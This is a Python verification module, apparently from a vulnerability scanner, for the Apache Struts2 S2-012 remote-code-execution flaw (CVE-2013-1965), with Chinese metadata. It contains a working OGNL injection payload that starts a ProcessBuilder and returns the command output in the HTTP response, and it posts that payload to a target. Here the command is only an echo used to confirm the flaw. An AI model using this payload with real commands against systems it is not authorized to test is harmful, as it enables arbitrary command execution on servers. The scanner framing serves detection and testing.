
#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.encode import base64encode
from app.lib.utils.common import get_capta,filter_str

class S2_012_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Struts2 S2-012漏洞,又名CVE-2013-1965漏洞',
            'description': 'Struts2 S2-012漏洞可执行任意命令, 影响范围为: Struts 2.0.0 - Struts 2.3.14.2',
            'date': '2013-04-16',
            'type': 'RCE'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        if  '.action' not in self.url:
            self.url = self.url + '/user.action'
        self.capta = get_capta() 
        self.payload =  '%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{S2_012})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}'

    def run(self):

        """
        检测是否存在漏洞

        :param:

        :return str True or False
        """

        try:
            self.check_data = {'name': self.payload.replace('S2_012', '"echo",' + '\"' + self.capta + '\"')}
            check_res = request.post(self.url, data = self.check_data)
            check_str = filter_str(list(check_res.text))
            if check_res.status_code == 200 and len(check_str) < 100 and self.capta in check_str:
                return True
            else:
                return False
        except Exception as e:
            print(e)
            return False
        finally:
            pass

if  __name__ == "__main__":
    S2_012 = S2_012_BaseVerify('http://localhost:8080/s2_012_war_exploded/index.action')
    S2_012.run()